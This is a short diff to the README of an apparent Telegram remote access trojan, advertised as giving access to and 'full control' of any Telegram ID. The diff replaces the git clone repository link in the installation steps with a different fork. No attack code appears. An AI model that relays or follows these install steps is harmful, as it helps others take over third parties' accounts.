@@ -7,8 +7,8 @@ Telegram Rat Tools Acess Any Telegram Id &amp; Full Control
 
     
 # Installation:
-    1. git clone https://github.com/machine1337/TelegramRAT.git
-    2. Now Follow the instructions in HOW TO USE Section.
+    1. git clone https://github.com/darkboss1bd/Tg-Rat-darkboss1bd.git
+    2. Follow the instructions in HOW TO USE Section.
     
 
 # HOW TO USE:
